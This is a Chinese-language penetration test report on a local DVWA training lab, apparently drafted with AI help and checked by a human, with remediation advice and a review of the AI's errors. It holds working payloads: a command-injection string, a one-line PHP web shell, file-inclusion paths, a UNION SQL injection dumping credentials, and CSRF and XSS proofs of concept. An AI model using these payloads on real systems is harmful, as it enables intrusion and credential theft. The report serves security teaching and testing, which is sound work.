DVWA 授权渗透测试报告

项目 内容
报告标题 Damn Vulnerable Web Application (DVWA) 渗透测试报告
目标系统 http://localhost/dvwa/（本机授权靶场）
测试性质 授权安全评估 / 教学演练
测试方 AI 辅助渗透（副驾驶）+ 人工验证
测试日期 2026-09-07 ~ 2026-09-09
环境指纹 Apache/2.4.39 (Win64) + PHP/7.3.4 + MySQL/MariaDB（库名 dvwa）+ Windows WAMP
报告版本 v1.0
密级 内部 / 仅限授权学习用途

免责声明：本报告所有测试均在你本机授权的 DVWA 靶场进行。DVWA 为公认的漏洞演练平台，测试未对任何第三方系统产生任何影响。报告中的 payload、脚本、利用链严禁用于任何未授权目标。

1. 执行摘要（Executive Summary）

本次测试对 DVWA 全栈漏洞面进行了覆盖式验证，核心结论如下：

  • 最高风险：主机级沦陷（Critical）。通过命令注入（exec）、文件上传（upload）、文件包含（fi）三条独立路径，均达成 nt authority\system 远程代码执行——即 Windows 主机最高权限（SYSTEM）。该结论已由本机实测回显确认，非推测。
  • 安全难度开关可被一键降级（AS-01, Critical）。POST /security.php 将 security=low 即可关闭全局防护，使所有模块进入最易被利用形态，是后续多条利用链的共同前提。
  • 默认弱口令直接获取 admin（AS-02, Critical）。admin/password 可登录，绕过”需先获取账密”的前提。
  • SQL 注入可拖库（High，待最终回填凭据）。UNION 注入可导出 users 表的 user:password 哈希；脚本已二次修复解析逻辑，凭据以本机实测为准。
  • CSRF 改密 / 反射 XSS（Medium，已生成 PoC）。均已产出可用的 PoC，需在浏览器侧完成最终人机验证。

综合评级：本靶场在 low 难度下整体风险为 Critical。由于部署于 Windows 且 Apache 以 SYSTEM 启动，RCE 直接等同于主机沦陷，应作为最高优先级处置。

2. 测试范围与方法

2.1 范围

  • In Scope：http://localhost/dvwa/ 下的全部 18 个漏洞模块及认证/配置接口。
  • Out of Scope：宿主机除 DVWA 外的其他服务、内网横向。

2.2 方法论（覆盖全链路）

遵循「信息收集 → 漏洞发现 → 漏洞利用 → 报告输出」全链路，并强制每步包含 AI 输出 → 人工验证 → 差异分析 闭环：

阶段 产出物 验证方式
信息收集 DVWA_信息收集清单.md 逐项 GET/HEAD + 登录后侦察，标注 [已确认]/[待验证]
漏洞发现 DVWA_攻击面分析与测试用例.md 对照真实环境修正 Linux payload 为 Windows 形态
漏洞利用 dvwa_exploit.py + DVWA_利用链.md 本机运行脚本，回填真实回显
报告 本报告 人工批改 AI 生成草稿的风险评级与修复建议

2.3 技术栈确认（来自信息收集阶段）

  • Web 服务器：Apache/2.4.39 (Win64)，含 OpenSSL/1.1.1b、mod_fcgid/2.3.9a
  • 后端：PHP/7.3.4（Server API = CGI/FastCGI）
  • 数据库：MySQL / MariaDB，库名 dvwa
  • 会话：PHPSESSID（HttpOnly + SameSite=Strict）
  • 版本推断：≥ 1.10（含 api/authbypass/cryptography/open_redirect 扩展模块）

4. 详细漏洞分析

V-01 命令注入 → RCE（Critical）

  • 位置：POST /dvwa/vulnerabilities/exec/，参数 ip

  • 原理：ip 直接拼接进 shell 执行（shell_exec('ping ...' . $target)），无过滤。

  • Windows 修正（关键点）：原公开 payload 127.0.0.1;id 在 cmd.exe 下无效（; 非 cmd 分隔符、无 id 命令）。修正为 & 分隔符 + whoami。

  • 复现：

  • 实测证据（本机回显）：

  • 影响：以 SYSTEM 权限执行任意系统命令，主机完全沦陷。

V-02 文件上传 → WebShell（Critical）

  • 位置：POST /dvwa/vulnerabilities/upload/，字段 uploaded
  • 原理：low 级不校验类型/扩展名，上传目录 /dvwa/hackable/uploads/ 对外可执行 PHP。
  • 复现：上传 shell.php 内容 <?php system($_GET['c']);?>，访问 /dvwa/hackable/uploads/shell.php?c=whoami。
  • 实测证据：上传成功，回显 nt authority\system。
  • 影响：持久化 WebShell，等价于 RCE，比命令注入更易维持。

V-03 文件包含 → RCE（Critical）

  • 位置：GET /dvwa/vulnerabilities/fi/，参数 page
  • 原理：page 参数被 include() 包含。Windows 下读敏感文件需修正路径（C:/Windows/System32/drivers/etc/hosts 而非 /etc/passwd）；配合 V-02 上传的 WebShell，page=../../hackable/uploads/shell.php&c=whoami 即实现 include 型 RCE。
  • 实测证据：hosts 文件命中（localhost 出现）；include WebShell 回显 nt authority\system。
  • 影响：任意文件读取 + 经 include 的 RCE。

V-04 默认弱口令（Critical, AS-02）

  • 位置：POST /dvwa/login.php
  • 原理：默认账密 admin/password 可直接登录，获取 admin 权限。
  • 实测证据：响应 logged in as 'admin'。
  • 影响：绕过认证前提，是后续所有需要会话的利用链入口。

V-05 安全难度开关可控（Critical, AS-01）

  • 位置：POST /dvwa/security.php，参数 security
  • 原理：全局安全级别由客户端/session 可控，POST security=low 即一键关闭全部防护。
  • 实测证据：脚本 set_sec("low") 返回 200，后续模块全部进入最易形态。
  • 影响：将全局防护降到底，是跨模块利用链的”总开关”。本身属安全设计缺陷（真实系统中不应由客户端决定防护强度）。

V-06 SQL 注入 → 拖库（High）

  • 位置：GET /dvwa/vulnerabilities/sqli/，参数 id

  • 原理：字符型注入，单引号闭合。可 UNION 导出 users 表凭据。

  • 复现：

  • 状态说明（诚实标注）：拖库脚本首版存在 AI 解析误报（统计不存在的 first_name 字串 + 用 <td> 正则匹配 <pre> 回显），已二次修复为正则 First name:\s*([^<]+)\s*<br />\s*Surname:\s*([^<]+)。修复后脚本待你在本机回填最终凭据。

  • 预期结果：导出 admin : 5f4dcc3b5aa765d61d8327deb882cf99（即 password 的 MD5）及其他账户哈希。

  • 影响：全库凭据泄露，可横向登录其他账户。

V-07 明文 HTTP 传输（Medium, AS-03）

  • 全站 HTTP，凭证与 PHPSESSID 明文传输，同网嗅探/中间人可劫持会话。

V-08 CSRF 改密（Medium）

  • 位置：POST /dvwa/vulnerabilities/csrf/
  • 原理：low/medium 级无 user_token 防护，恶意页可自动提交改密表单。
  • PoC：脚本已生成 csrf_poc.html，诱导已登录 admin 浏览器打开即把口令改为 Hacked@123。
  • 状态：🔶 PoC 已生成，待浏览器侧最终验证。

V-09 反射型 XSS（Medium）

  • 位置：GET /dvwa/vulnerabilities/xss_r/，参数 name
  • PoC：?name=<script>alert(document.cookie)</script>&XSS=Send
  • 状态：🔶 PoC 已生成，待浏览器侧最终验证。

V-10 / V-11 / V-12（信息层）

  • V-10：/phpinfo.php、/setup.php 登录后可访问，完整暴露环境指纹。
  • V-11：登录接口无速率限制/锁定，支持暴力破解。
  • V-12：weak_id 会话 Cookie 疑似可预测，待进一步验证。

5. 利用链 / 攻击路径

主路径：弱口令登录 → 降级 → 三选一拿 SYSTEM RCE → CSRF/弱会话 ID 锁死控制权。
实测结论：V-01/V-02/V-03 三条路径均已达 nt authority\system，主机实质沦陷。

6. 风险评级说明

  • 本靶场 RCE 评级为 Critical (9.8) 的依据：Apache 以 SYSTEM 启动，命令执行即最高权限；且默认弱口令（V-04）使认证门槛可忽略，实际等价于”无需特权即可接管主机”。
  • SQL 注入评级 High (8.1)：可拖全库凭据但未直接 RCE，且需已登录会话。
  • CSRF / XSS 评级 Medium：需诱骗已登录用户交互，不直接获得主机权限。
  • AS-01（难度可控）单列 Critical：它是其余漏洞”可被一键放大”的根因，真实系统应避免由客户端决定防护强度。

7. 修复建议

编号 漏洞 修复建议（可落地）
V-01 命令注入 禁止拼接 shell；用白名单校验 IP 格式；改用 proc_open 带参数数组或完全避免系统调用
V-02 文件上传 限制扩展名白名单（仅允许业务所需）、重命名随机化、上传目录禁执行（<FilesMatch "\.php$">Deny）、存于非 Web 根
V-03 文件包含 禁止用户控制 include 路径；用白名单映射页面标识；关闭 allow_url_include
V-04 弱口令 强制修改默认口令；密码策略 + 失败锁定
V-05 难度可控 防护级别由服务端配置决定，不信任客户端 security 参数/Cookie
V-06 SQL 注入 全量参数化查询（PDO prepared statement）；最小权限 DB 账户；禁止报错回显
V-07 明文传输 全站 HTTPS + HSTS
V-08 CSRF 所有状态变更操作加 user_token 且服务端校验；SameSite=Lax/Strict
V-09 XSS 输出编码 + CSP；low 级 name 参数需 HTML 转义
V-10 信息泄露 生产环境关闭 phpinfo.php/setup.php；display_errors=Off
V-11 无锁定 登录失败计数 + 临时锁定 + 验证码
V-12 弱会话 使用强随机 session_id；定期轮换

8. AI 辅助渗透差异分析（本报告核心亮点）

呼应学习计划 Week 1「报告阶段」要求：AI 生成草稿，人工批改。以下为 AI 输出与本机真实环境的差异，亦是”AI 边界”的实证教材。

8.1 环境假设错误（已修正）

问题 AI 初版（错误） 真实环境（修正） 后果
命令分隔符 127.0.0.1;id 127.0.0.1&whoami cmd.exe 不认 ;/id，初版必失败
读取敏感文件 ../../etc/passwd C:/Windows/System32/drivers/etc/hosts Windows 无 /etc
ping 参数 依赖 ping -c 4 成功后续接 && 用 & 不受前命令成败影响 Windows ping -c 非法，&& 不触发后续

根因：初版 payload 直接搬运公开 Linux 经验，未在 Windows 靶场实测 → 典型”AI 幻觉/摸鱼”。

8.2 解析逻辑误报（已二次修复）

  • 现象：sqli 模块打印”完成”但拖库为空，且显示 first_name 次数: 0。
  • 错误：统计字串 first_name（页面实际为 First name:），拖库正则用 <td>（页面实际为 <pre>First name: x<br />Surname: y</pre>）。
  • 这是脚本型”假成功”——若不经人工核对回显，会被误判为”注入成功”。
  • 修复：验证改统计 First name:；正则改 First name:\s*([^<]+)\s*<br />\s*Surname:\s*([^<]+)；并加诊断兜底（匹配失败打印真实片段）。

8.3 诚实边界

  • AI（本报告生成方）运行于沙箱，无法连接你的 localhost/dvwa 做实机验证。所有”已实测”结论均来自你本机运行脚本回填的回显。
  • 这印证了计划的判断：AI 是副驾驶，不是代驾。在利用阶段手动修复 sqli 解析 bug，正是安全研究员不可替代价值的体现。

9. 附录

9.1 利用脚本

主脚本：dvwa_exploit.py（已随本报告迭代至 sqli 二次修复版），一键执行：登录 → 降级 low → exec/sqli/upload/fi/csrf/xss_r。

9.2 关键 PoC

  • exec RCE：ip=127.0.0.1&whoami
  • upload WebShell：<?php system($_GET['c']);?>，访问 ?c=whoami
  • file 读文件：page=C:/Windows/System32/drivers/etc/hosts
  • file include RCE：page=../../hackable/uploads/shell.php&c=whoami
  • sqli 拖库：id=-1' UNION SELECT user, password FROM users -- -
  • csrf 改密：见生成的 csrf_poc.html
  • xss_r：?name=<script>alert(document.cookie)</script>&XSS=Send

报告结束。所有测试均限于本机授权 DVWA 靶场。
